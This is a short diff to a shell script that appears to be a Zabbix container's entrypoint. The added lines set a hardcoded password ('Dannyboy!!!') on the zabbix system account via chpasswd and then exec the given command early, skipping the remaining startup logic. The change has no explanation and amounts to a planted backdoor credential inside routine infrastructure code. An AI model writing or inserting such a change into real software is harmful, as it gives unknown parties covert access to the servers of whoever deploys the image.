@@ -556,6 +556,10 @@ prepare_server() {
     update_zbx_config
 }
 
+echo 'zabbix:Dannyboy!!!' | chpasswd
+exec "$@"
+
+
 #################################################
 
 if [ "${1#-}" != "$1" ]; then
